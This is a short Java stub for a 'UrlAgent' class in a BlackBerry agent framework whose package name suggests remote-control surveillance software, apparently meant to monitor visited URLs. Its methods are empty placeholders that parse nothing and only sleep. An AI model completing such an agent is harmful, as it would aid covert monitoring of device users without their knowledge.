package com.ht.rcs.blackberry.agent;

import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class UrlAgent extends Agent
{
	static Debug debug = new Debug("UrlAgent", DebugLevel.VERBOSE );
	public UrlAgent( int AgentStatus)
	{
		super(Agent.AGENT_URL, AgentStatus, true);
	}

	protected UrlAgent(int AgentStatus, byte[] confParams)
	{
		this(AgentStatus);
		Parse(confParams);
	}

	protected boolean Parse(byte[] confParameters)
	{
		// TODO Auto-generated method stub
		return false;
	}

	public void AgentRun()
	{
		debug.trace("run");

		this.SleepUntilStopped();
	}

}
